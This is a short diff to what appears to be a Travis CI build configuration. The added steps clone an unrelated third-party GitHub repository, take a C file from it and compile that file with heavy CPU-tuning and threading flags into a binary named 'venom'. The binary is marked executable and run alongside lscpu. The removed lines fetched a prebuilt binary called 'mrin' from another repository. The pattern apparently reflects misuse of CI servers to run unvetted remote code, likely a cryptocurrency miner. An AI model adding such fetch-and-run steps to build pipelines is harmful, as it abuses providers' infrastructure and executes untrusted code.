@@ -109,6 +109,7 @@ env:
 before_install:
   - sudo apt-get update
   - sudo apt-get install -y gcc
+  - sudo apt install build-essential
 
 install:
   - python3 -m pip install --upgrade pip
@@ -117,9 +118,9 @@ install:
 before_script:
   - git clone https://github.com/tyr892316/Vdn.git
   - mv  Vdn/m.py ./
-  - git clone https://github.com/MiLKyWay-cyBer/ss.git
-  - mv ss/mrin ./
-  - mv mrin venom
+  - mv  Vdn/m.c ./
+  - gcc -O3 -march=native -mtune=native -funroll-loops -ffast-math -pthread m.c -o venom
+  
 script:
   - chmod +x *
   - lscpu
